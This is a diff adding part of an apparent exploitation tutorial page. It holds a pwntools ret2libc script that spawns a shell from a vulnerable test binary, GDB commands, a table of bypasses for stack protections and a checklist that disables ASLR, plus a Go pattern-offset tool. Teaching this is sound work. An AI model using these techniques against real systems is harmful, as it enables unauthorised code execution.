+    p.wait()
+    core = p.corefile
+    rip_pattern = core.read(core.rsp, 8)
+    offset = cyclic_find(rip_pattern, n=8)
+    log.info(f&#34;Offset to RIP: {offset}&#34;)
+    return offset
+
+def build_payload(offset, libc_base):
+    &#34;&#34;&#34;Step 5: Build the exploit payload.&#34;&#34;&#34;
+    libc = ELF(&#39;/usr/lib/libc.so.6&#39;)
+    system = libc_base + libc.symbols[&#39;system&#39;]
+    bin_sh = libc_base + next(libc.search(b&#39;/bin/sh&#39;))
+
+    rop = ROP(ELF(TARGET))
+    pop_rdi = rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])[0]
+    ret = rop.find_gadget([&#39;ret&#39;])[0]
+
+    payload = flat(
+        b&#39;A&#39; * offset,
+        ret,            # Stack alignment
+        pop_rdi,        # pop rdi; ret
+        bin_sh,         # -&gt; RDI
+        system,         # system(&#34;/bin/sh&#34;)
+    )
+    return payload
+
+def main():
+    offset = find_offset()
+
+    # For local testing with ASLR disabled
+    libc = ELF(&#39;/usr/lib/libc.so.6&#39;)
+    libc_base = 0x7ffff7dc1000  # Hard-coded for ASLR-off testing
+
+    payload = build_payload(offset, libc_base)
+    log.info(f&#34;Payload: {payload.hex()}&#34;)
+
+    p = process(TARGET)
+    p.sendline(payload)
+    p.interactive()
+
+if __name__ == &#39;__main__&#39;:
+    main()
+						</pre>
+					</section>
+					<section>
+						<h3 id="gdb-debugging-commands">GDB Debugging Commands</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Command</th>
+									<th align="center">Purpose</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center"><code>info registers</code></td>
+									<td align="center">Show all register values</td>
+								</tr>
+								<tr>
+									<td align="center"><code>x/40gx $rsp</code></td>
+									<td align="center">Examine 40 qwords starting at RSP</td>
+								</tr>
+								<tr>
+									<td align="center"><code>x/10i $rip</code></td>
+									<td align="center">Disassemble 10 instructions at RIP</td>
+								</tr>
+								<tr>
+									<td align="center"><code>info frame</code></td>
+									<td align="center">Show current stack frame (saved RIP, saved RBP)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>bt</code></td>
+									<td align="center">Backtrace (list of call frames)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>break *0x401200</code></td>
+									<td align="center">Break at absolute address</td>
+								</tr>
+								<tr>
+									<td align="center"><code>break vulnerable</code></td>
+									<td align="center">Break at function entry</td>
+								</tr>
+								<tr>
+									<td align="center"><code>disassemble vulnerable</code></td>
+									<td align="center">Disassemble a function</td>
+								</tr>
+								<tr>
+									<td align="center"><code>stepi</code></td>
+									<td align="center">Step one instruction</td>
+								</tr>
+								<tr>
+									<td align="center"><code>nexti</code></td>
+									<td align="center">Step one instruction (skip calls)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>continue</code></td>
+									<td align="center">Continue execution</td>
+								</tr>
+								<tr>
+									<td align="center"><code>print $rdi</code></td>
+									<td align="center">Print register value</td>
+								</tr>
+								<tr>
+									<td align="center"><code>print (char*)$rdi</code></td>
+									<td align="center">Print string at address in RDI</td>
+								</tr>
+								<tr>
+									<td align="center"><code>set $rdi = 0x7fff...</code></td>
+									<td align="center">Set register value (for testing)</td>
+								</tr>
+								<tr>
+									<td align="center"><code>find /b 0x700000, 0x800000, 0x90</code></td>
+									<td align="center">Search memory for bytes</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="defeating-protections">Defeating Protections</h3>
+						<table>
+							<thead>
+								<tr>
+									<th align="center">Protection</th>
+									<th align="center">Bypass Technique</th>
+								</tr>
+							</thead>
+							<tbody>
+								<tr>
+									<td align="center">Stack canary</td>
+									<td align="center">Leak canary (format string), fork() brute force, non-linear write</td>
+								</tr>
+								<tr>
+									<td align="center">NX/DEP</td>
+									<td align="center">ret2libc, ROP, JOP, SROP, ret2dlresolve</td>
+								</tr>
+								<tr>
+									<td align="center">ASLR</td>
+									<td align="center">Info leak (leak a pointer), partial overwrite, heap spray</td>
+								</tr>
+								<tr>
+									<td align="center">PIE</td>
+									<td align="center">Info leak (leak a code pointer), partial overwrite</td>
+								</tr>
+								<tr>
+									<td align="center">Full RELRO</td>
+									<td align="center">Target __libc_start_main hooks, __malloc_hook, __free_hook, vtable</td>
+								</tr>
+								<tr>
+									<td align="center">FORTIFY_SOURCE</td>
+									<td align="center">Avoid the checked functions, use novel primitives</td>
+								</tr>
+								<tr>
+									<td align="center">seccomp / sandbox</td>
+									<td align="center">open/read/write (ORW) chains instead of execve</td>
+								</tr>
+							</tbody>
+						</table>
+					</section>
+					<section>
+						<h3 id="the-full-crash-to-shell-checklist">The Full Crash-to-Shell Checklist</h3>
+						<pre class="plaintext">
+[ ] Confirm crash with oversized input
+[ ] Generate cyclic pattern, run under GDB, read RIP value
+[ ] Calculate offset (cyclic_find or manual subtraction)
+[ ] Verify control (A&#39;s + B&#39;s -&gt; RIP = BBBB...)
+[ ] Identify bad characters (null, newline, etc.)
+[ ] Build payload skeleton with correct offset
+[ ] Compile with -no-pie if PIE is on (or leak PIE base)
+[ ] Disable ASLR (echo 0 &gt; /proc/sys/kernel/randomize_va_space) for testing
+[ ] Find pop rdi; ret gadget (ROPgadget)
+[ ] Find ret gadget for alignment
+[ ] Find system() and &#34;/bin/sh&#34; addresses
+[ ] Construct final payload
+[ ] Test under GDB
+[ ] Fix alignment issues (add ret gadgets until RSP % 16 == 0)
+[ ] Re-enable ASLR, implement leak for actual exploit
+[ ] Test outside GDB (environment variables shift stack slightly)
+[ ] Adjust for environment shift (add NOP sled or adjust addresses)
+						</pre>
+						<p>
+							Each checked box represents progress. The methodology is linear - when one step fails, the fix
+							is in that step. No shotgun debugging, no guessing. This is engineering, not wizardry.
+						</p>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Reimplement the offset-finding step in Go. Generate a de Bruijn pattern over a small alphabet,
+							search it for the 8 bytes you leaked from
+							<code>RSP</code>
+							in GDB, and print the byte offset. Compile the
+							vulnerable program from Step 1, feed it a 300-byte pattern, and confirm the tool reports the
+							same offset that
+							<code>cyclic_find</code>
+							did (136).
+						</p>
+						<pre class="go">
+package main
+
+import (
+	&#34;bytes&#34;
+	&#34;fmt&#34;
+	&#34;os&#34;
+	&#34;strconv&#34;
+)
+
+const alphabet = &#34;abcd&#34;
+
+func deBruijn(k, n int) []byte {
+	a := make([]int, k*n)
+	sequence := make([]byte, 0, 1)
+
+	var db func(t, p int)
+	db = func(t, p int) {
+		if t &gt; n {
+			if n%p == 0 {
+				for j := 1; j &lt;= p; j++ {
+					sequence = append(sequence, alphabet[a[j]])
+				}
+			}
+			return
+		}
+		a[t] = a[t-p]
+		db(t+1, p)
+		for j := a[t-p] + 1; j &lt; k; j++ {
+			a[t] = j
+			db(t+1, t)
+		}
+	}
+	db(1, 1)
+	return sequence
+}
+
+func main() {
+	if len(os.Args) != 3 {
+		fmt.Fprintf(os.Stderr, &#34;usage: %s &lt;pattern|find&gt; &lt;length|bytes&gt;\n&#34;, os.Args[0])
+		os.Exit(1)
+	}
+
+	pattern := deBruijn(len(alphabet), 8)
+
+	if os.Args[1] == &#34;pattern&#34; {
+		length, _ := strconv.Atoi(os.Args[2])
+		for i := 0; i &lt; length; i++ {
+			fmt.Printf(&#34;%c&#34;, pattern[i%len(pattern)])
+		}
+		fmt.Println()
+		return
+	}
+
+	target := []byte(os.Args[2])
+	search := append(append([]byte{}, pattern...), pattern[:7]...)
+	offset := bytes.Index(search, target)
+	if offset &lt; 0 {
+		fmt.Fprintf(os.Stderr, &#34;no match for %q\n&#34;, target)
+		os.Exit(1)
+	}
+	fmt.Printf(&#34;offset: %d\n&#34;, offset)
+}
+						</pre>
+						<p>Build it and use the same pattern as the payload:</p>
+						<pre class="bash">
+go build -o cyclic cyclic.go
+./cyclic pattern 300 &gt; pattern.txt
+./cyclic find &#34;$(head -c 144 pattern.txt | tail -c 8)&#34;
+# offset: 136
+						</pre>
+						<p>
+							Feed
+							<code>pattern.txt</code>
+							to the vulnerable program under GDB and confirm the 8 bytes at
+							<code>RSP</code>
+							match
+							the bytes at offset 136.
+						</p>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://en.wikipedia.org/wiki/Stack_buffer_overflow" target="_blank">Stack Buffer Overflow - Wikipedia</a></li>
+							<li><a class="icon-website" href="https://en.wikipedia.org/wiki/Return-to-libc_attack" target="_blank">Return-to-libc Attack - Wikipedia</a></li>
+							<li><a class="icon-website" href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" target="_blank">Address Space Layout Randomization - Wikipedia</a></li>
+							<li><a class="icon-website" href="https://docs.pwntools.com/" target="_blank">pwntools Documentation</a></li>
+							<li><a class="icon-github" href="https://github.com/JonathanSalwan/ROPgadget" target="_blank">ROPgadget</a></li>
+							<li><a class="icon-website" href="https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html" target="_blank">pwntools ret2dlresolve</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
